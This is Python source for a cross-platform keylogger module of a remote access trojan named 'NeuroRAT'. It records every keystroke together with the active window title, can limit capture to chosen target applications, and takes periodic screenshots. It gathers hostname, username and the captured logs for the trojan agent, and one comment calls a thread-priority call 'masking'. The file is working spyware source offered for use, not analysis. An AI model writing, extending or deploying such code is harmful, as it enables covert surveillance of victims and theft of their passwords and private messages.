#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
NeuroRAT Keylogger Module
-------------------------
Cross-platform keylogger module for NeuroRAT agent.
"""

import os
import sys
import time
import json
import base64
import signal
import logging
import platform
import threading
import traceback
from datetime import datetime
from typing import Dict, List, Any, Optional, Tuple

# Import platform-specific dependencies only when needed
try:
    from pynput import keyboard, mouse
    PYNPUT_AVAILABLE = True
except ImportError:
    PYNPUT_AVAILABLE = False

# For screenshots and window info
try:
    if platform.system() == "Windows":
        import win32gui
        import win32process
        import psutil
        from PIL import ImageGrab
        SCREENSHOT_AVAILABLE = True
    elif platform.system() == "Darwin":  # macOS
        from AppKit import NSWorkspace
        from PIL import ImageGrab
        SCREENSHOT_AVAILABLE = True
    elif platform.system() == "Linux":
        import gi
        gi.require_version('Gdk', '3.0')
        from gi.repository import Gdk
        from PIL import Image
        import Xlib
        import Xlib.display
        SCREENSHOT_AVAILABLE = True
    else:
        SCREENSHOT_AVAILABLE = False
except ImportError:
    SCREENSHOT_AVAILABLE = False

__version__ = "1.0.0"
__author__ = "Mr. Thomas Anderson"

# Setup logging
logging.basicConfig(level=logging.INFO,
                    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger("NeuroRAT-Keylogger")

# Global variables
_is_running = False
_keylog_buffer = []
_keylog_lock = threading.Lock()
_keylog_thread = None
_log_file = None

def _init_platform_keylogger():
    """Initialize the platform-specific keylogger"""
    platform = sys.platform
    
    if platform.startswith('win'):
        return _init_windows_keylogger()
    elif platform.startswith('linux'):
        return _init_linux_keylogger()
    elif platform.startswith('darwin'):
        return _init_macos_keylogger()
    else:
        logger.error(f"Unsupported platform: {platform}")
        return None

def _init_windows_keylogger():
    """Initialize Windows keylogger"""
    try:
        import win32api
        import win32console
        import win32gui
        import pythoncom
        import pyHook
        
        def key_event(event):
            global _keylog_buffer
            
            if event.Ascii:
                char = chr(event.Ascii)
                with _keylog_lock:
                    _keylog_buffer.append({
                        "timestamp": datetime.now().isoformat(),
                        "key": char,
                        "ascii": event.Ascii,
                        "window": event.WindowName
                    })
                    
                    if _log_file:
                        _log_file.write(f"{datetime.now().isoformat()},{char},{event.Ascii},{event.WindowName}\n")
                        _log_file.flush()
            
            return True
        
        def keylogger_thread():
            hm = pyHook.HookManager()
            hm.KeyDown = key_event
            hm.HookKeyboard()
            pythoncom.PumpMessages()
        
        return keylogger_thread
    
    except ImportError:
        logger.error("Required modules not found for Windows keylogger")
        return None

def _init_linux_keylogger():
    """Initialize Linux keylogger"""
    try:
        from pynput import keyboard
        
        def on_press(key):
            global _keylog_buffer
            
            try:
                char = key.char
            except AttributeError:
                char = str(key)
            
            with _keylog_lock:
                _keylog_buffer.append({
                    "timestamp": datetime.now().isoformat(),
                    "key": char
                })
                
                if _log_file:
                    _log_file.write(f"{datetime.now().isoformat()},{char}\n")
                    _log_file.flush()
        
        def keylogger_thread():
            with keyboard.Listener(on_press=on_press) as listener:
                listener.join()
        
        return keylogger_thread
    
    except ImportError:
        logger.error("Required modules not found for Linux keylogger")
        return None

def _init_macos_keylogger():
    """Initialize macOS keylogger"""
    try:
        from pynput import keyboard
        
        def on_press(key):
            global _keylog_buffer
            
            try:
                char = key.char
            except AttributeError:
                char = str(key)
            
            with _keylog_lock:
                _keylog_buffer.append({
                    "timestamp": datetime.now().isoformat(),
                    "key": char
                })
                
                if _log_file:
                    _log_file.write(f"{datetime.now().isoformat()},{char}\n")
                    _log_file.flush()
        
        def keylogger_thread():
            with keyboard.Listener(on_press=on_press) as listener:
                listener.join()
        
        return keylogger_thread
    
    except ImportError:
        logger.error("Required modules not found for macOS keylogger")
        return None

def start(log_path=None):
    """Start the keylogger"""
    global _is_running, _keylog_thread, _log_file
    
    if _is_running:
        return {"status": "error", "message": "Keylogger already running"}
    
    # Initialize log file if specified
    if log_path:
        try:
            _log_file = open(log_path, "a")
            _log_file.write(f"# NeuroRAT Keylogger Session started at {datetime.now().isoformat()}\n")
            _log_file.flush()
        except Exception as e:
            logger.error(f"Failed to open log file: {e}")
            return {"status": "error", "message": f"Failed to open log file: {e}"}
    
    # Initialize platform-specific keylogger
    keylogger_func = _init_platform_keylogger()
    if not keylogger_func:
        return {"status": "error", "message": "Keylogger not supported on this platform"}
    
    # Start keylogger thread
    _keylog_thread = threading.Thread(target=keylogger_func)
    _keylog_thread.daemon = True
    _keylog_thread.start()
    
    _is_running = True
    return {"status": "success", "message": "Keylogger started"}

def stop():
    """Stop the keylogger"""
    global _is_running, _keylog_thread, _log_file
    
    if not _is_running:
        return {"status": "error", "message": "Keylogger not running"}
    
    # Stop keylogger thread
    # Note: This is platform specific and might not work on all platforms
    if _keylog_thread:
        # We can't easily stop the thread, so we'll just mark it as not running
        # and let it be garbage collected
        _keylog_thread = None
    
    # Close log file if open
    if _log_file:
        _log_file.write(f"# NeuroRAT Keylogger Session ended at {datetime.now().isoformat()}\n")
        _log_file.close()
        _log_file = None
    
    _is_running = False
    return {"status": "success", "message": "Keylogger stopped"}

def status():
    """Get the status of the keylogger"""
    global _is_running
    
    return {
        "status": "success",
        "running": _is_running,
        "log_size": len(_keylog_buffer)
    }

def get_log(clear=False):
    """Get the keylogger log"""
    global _keylog_buffer
    
    with _keylog_lock:
        log = _keylog_buffer.copy()
        
        if clear:
            _keylog_buffer.clear()
    
    return {
        "status": "success",
        "log": log,
        "count": len(log)
    }

def run(action="status", **kwargs):
    """Main entry point for the keylogger module"""
    if action == "start":
        return start(**kwargs)
    elif action == "stop":
        return stop()
    elif action == "status":
        return status()
    elif action == "get_log":
        return get_log(**kwargs)
    else:
        return {"status": "error", "message": f"Unknown action: {action}"}

class Keylogger:
    def __init__(self, output_dir: str = None, screenshot_interval: int = 60):
        """Initialize the keylogger module."""
        self.system = platform.system()
        self.output_dir = output_dir or os.path.join(os.path.dirname(os.path.abspath(__file__)), "data")
        os.makedirs(self.output_dir, exist_ok=True)
        
        # Set up logging
        log_file = os.path.join(self.output_dir, "keylogger.log")
        logging.basicConfig(
            filename=log_file,
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s'
        )
        self.logger = logging.getLogger("Keylogger")
        
        # Keylog data
        self.keylog_file = os.path.join(self.output_dir, "keylog.txt")
        self.window_log_file = os.path.join(self.output_dir, "window_log.txt")
        self.screenshot_dir = os.path.join(self.output_dir, "screenshots")
        os.makedirs(self.screenshot_dir, exist_ok=True)
        
        # State variables
        self.current_window = ""
        self.running = False
        self.key_buffer = []
        self.buffer_lock = threading.Lock()
        self.last_window_check = 0
        self.window_check_interval = 1  # Check active window every second
        
        # Screenshot settings
        self.screenshot_interval = screenshot_interval
        self.last_screenshot = 0
        
        # Check dependencies
        if not PYNPUT_AVAILABLE:
            self.logger.error("pynput module not available, keylogging functionality will be limited")
        if not SCREENSHOT_AVAILABLE:
            self.logger.error("Screenshot dependencies not available, screenshot functionality will be disabled")

    def _log_key_press(self, key):
        """Log a key press event."""
        try:
            with self.buffer_lock:
                # Convert key to a readable string
                key_str = ""
                if hasattr(key, 'char') and key.char:
                    key_str = key.char
                else:
                    # Handle special keys
                    key_str = f"[{str(key).replace('Key.', '')}]"
                
                self.key_buffer.append(key_str)
                
                # Flush buffer if it's getting large or contains sensitive keys
                sensitive_keys = ["[enter]", "[return]", "[tab]"]
                if len(self.key_buffer) > 20 or any(k in sensitive_keys for k in self.key_buffer):
                    self._flush_key_buffer()
                    
        except Exception as e:
            self.logger.error(f"Error logging key press: {str(e)}")

    def _flush_key_buffer(self):
        """Flush the key buffer to file."""
        try:
            with self.buffer_lock:
                if not self.key_buffer:
                    return
                    
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                keys_text = "".join(self.key_buffer)
                
                with open(self.keylog_file, "a", encoding="utf-8") as f:
                    f.write(f"\n[{timestamp} - {self.current_window}]\n{keys_text}\n")
                    
                self.key_buffer = []
                
        except Exception as e:
            self.logger.error(f"Error flushing key buffer: {str(e)}")

    def _check_active_window(self):
        """Check and log the currently active window."""
        try:
            current_time = time.time()
            if current_time - self.last_window_check < self.window_check_interval:
                return
                
            self.last_window_check = current_time
            
            window_title = ""
            window_process = ""
            
            # Get window info based on the platform
            if self.system == "Windows":
                try:
                    hwnd = win32gui.GetForegroundWindow()
                    window_title = win32gui.GetWindowText(hwnd)
                    _, pid = win32process.GetWindowThreadProcessId(hwnd)
                    try:
                        window_process = psutil.Process(pid).name()
                    except psutil.NoSuchProcess:
                        window_process = "Unknown"
                except Exception as e:
                    self.logger.error(f"Error getting Windows window info: {str(e)}")
                    
            elif self.system == "Darwin":  # macOS
                try:
                    active_app = NSWorkspace.sharedWorkspace().activeApplication()
                    window_title = active_app['NSApplicationName']
                    window_process = active_app['NSApplicationPath'].split('/')[-1]
                except Exception as e:
                    self.logger.error(f"Error getting macOS window info: {str(e)}")
                    
            elif self.system == "Linux":
                try:
                    display = Xlib.display.Display()
                    window = display.get_input_focus().focus
                    window_class = window.get_wm_class()
                    window_title = window.get_wm_name()
                    if window_class:
                        window_process = window_class[1]
                    else:
                        window_process = "Unknown"
                except Exception as e:
                    self.logger.error(f"Error getting Linux window info: {str(e)}")
                    
            # Update current window info if changed
            window_info = f"{window_title} ({window_process})"
            if window_info != self.current_window and window_title:
                self.current_window = window_info
                
                # Log the window change
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                with open(self.window_log_file, "a", encoding="utf-8") as f:
                    f.write(f"[{timestamp}] {window_info}\n")
                    
                # Flush the key buffer when window changes
                self._flush_key_buffer()
                
        except Exception as e:
            self.logger.error(f"Error checking active window: {str(e)}")

    def _take_screenshot(self):
        """Take a screenshot and save it."""
        try:
            current_time = time.time()
            if current_time - self.last_screenshot < self.screenshot_interval:
                return
                
            self.last_screenshot = current_time
            
            if not SCREENSHOT_AVAILABLE:
                return
                
            timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
            screenshot_path = os.path.join(self.screenshot_dir, f"screenshot_{timestamp}.png")
            
            # Take screenshot based on platform
            if self.system in ["Windows", "Darwin"]:  # Windows or macOS
                screenshot = ImageGrab.grab()
                screenshot.save(screenshot_path)
                
            elif self.system == "Linux":
                window = Gdk.get_default_root_window()
                x, y, width, height = window.get_geometry()
                screenshot = Gdk.pixbuf_get_from_window(window, x, y, width, height)
                
                # Convert to PIL Image and save
                screenshot_data = screenshot.get_pixels()
                screenshot_image = Image.frombytes(
                    "RGB",
                    (width, height),
                    screenshot_data,
                    "raw",
                    "RGB",
                    screenshot.get_rowstride()
                )
                screenshot_image.save(screenshot_path)
                
            self.logger.info(f"Screenshot saved: {screenshot_path}")
            
        except Exception as e:
            self.logger.error(f"Error taking screenshot: {str(e)}")

    def _monitoring_thread(self):
        """Thread for periodic monitoring tasks."""
        try:
            while self.running:
                self._check_active_window()
                self._take_screenshot()
                
                # Flush buffer periodically
                with self.buffer_lock:
                    if self.key_buffer:
                        self._flush_key_buffer()
                        
                time.sleep(1)
                
        except Exception as e:
            self.logger.error(f"Error in monitoring thread: {str(e)}")

    def start(self):
        """Start the keylogger."""
        if self.running:
            return
            
        self.running = True
        self.logger.info("Keylogger started")
        
        # Start monitoring thread
        self.monitor_thread = threading.Thread(target=self._monitoring_thread)
        self.monitor_thread.daemon = True
        self.monitor_thread.start()
        
        # Set up listeners
        if PYNPUT_AVAILABLE:
            self.key_listener = keyboard.Listener(on_press=self._log_key_press)
            self.key_listener.daemon = True
            self.key_listener.start()
            
            # Optional: Mouse click listener
            # self.mouse_listener = mouse.Listener(on_click=self._log_mouse_click)
            # self.mouse_listener.daemon = True
            # self.mouse_listener.start()
        else:
            self.logger.warning("Keylogging disabled due to missing dependencies")

    def stop(self):
        """Stop the keylogger."""
        if not self.running:
            return
            
        self.running = False
        self.logger.info("Keylogger stopped")
        
        # Flush remaining keys
        self._flush_key_buffer()
        
        # Stop listeners
        if PYNPUT_AVAILABLE and hasattr(self, 'key_listener'):
            self.key_listener.stop()
            
        # Wait for monitoring thread to finish
        if hasattr(self, 'monitor_thread') and self.monitor_thread.is_alive():
            self.monitor_thread.join(timeout=2)

    def cleanup(self):
        """Clean up resources."""
        self.stop()

    def collect_data(self) -> Dict[str, Any]:
        """Collect all logged data into a dictionary."""
        data = {
            "timestamp": datetime.now().isoformat(),
            "system": self.system,
            "hostname": platform.node(),
            "username": os.getlogin() if hasattr(os, 'getlogin') else "unknown",
            "keylog_file": self.keylog_file,
            "window_log_file": self.window_log_file,
            "screenshot_dir": self.screenshot_dir,
            "screenshot_count": len(os.listdir(self.screenshot_dir)) if os.path.exists(self.screenshot_dir) else 0
        }
        
        # Add keylog data if available
        if os.path.exists(self.keylog_file):
            try:
                with open(self.keylog_file, "r", encoding="utf-8") as f:
                    data["keylog_content"] = f.read()
            except Exception as e:
                self.logger.error(f"Error reading keylog file: {str(e)}")
                data["keylog_content"] = "Error reading keylog file"
                
        # Add window log data if available
        if os.path.exists(self.window_log_file):
            try:
                with open(self.window_log_file, "r", encoding="utf-8") as f:
                    data["window_log_content"] = f.read()
            except Exception as e:
                self.logger.error(f"Error reading window log file: {str(e)}")
                data["window_log_content"] = "Error reading window log file"
                
        return data

    def run_for_duration(self, duration_seconds: int) -> Dict[str, Any]:
        """Run the keylogger for a specified duration."""
        self.logger.info(f"Starting keylogger for {duration_seconds} seconds")
        
        self.start()
        
        try:
            # Run for specified duration
            time.sleep(duration_seconds)
        except KeyboardInterrupt:
            self.logger.info("Keylogger interrupted")
        finally:
            self.stop()
            
        # Collect and return data
        return self.collect_data()

def get_active_window():
    # Кроссплатформенная функция получения активного окна
    try:
        if os.name == 'nt':
            import win32gui
            return win32gui.GetWindowText(win32gui.GetForegroundWindow())
        elif sys.platform == 'darwin':
            from AppKit import NSWorkspace
            return NSWorkspace.sharedWorkspace().activeApplication()['NSApplicationName']
        else:
            import subprocess
            return subprocess.check_output(['xdotool', 'getactivewindow', 'getwindowname']).decode().strip()
    except Exception:
        return "unknown"

def start_keylogger(target_apps=None):
    from pynput import keyboard
    def on_press(key):
        active_window = get_active_window()
        if not target_apps or any(app.lower() in active_window.lower() for app in target_apps):
            with open("keylog.txt", "a") as f:
                f.write(f"{time.time()} {active_window} {key}\n")
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    # Маскировка потока (Windows)
    try:
        import ctypes
        ctypes.windll.kernel32.SetThreadPriority(-2)  # BELOW_NORMAL_PRIORITY_CLASS
    except Exception:
        pass

def main():
    """Main function to run the keylogger module."""
    try:
        output_dir = sys.argv[1] if len(sys.argv) > 1 else None
        duration = int(sys.argv[2]) if len(sys.argv) > 2 else 60  # Default: 1 minute
        screenshot_interval = int(sys.argv[3]) if len(sys.argv) > 3 else 15  # Default: 15 seconds
        
        keylogger = Keylogger(output_dir, screenshot_interval)
        data = keylogger.run_for_duration(duration)
        
        # Save collected data to JSON file
        result_file = os.path.join(keylogger.output_dir, f"keylogger_results_{datetime.now().strftime('%Y%m%d%H%M%S')}.json")
        with open(result_file, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2)
            
        print(f"Keylogger data collected and saved to: {result_file}")
        
    except Exception as e:
        print(f"Error: {str(e)}")
        print(traceback.format_exc())

if __name__ == "__main__":
    main() 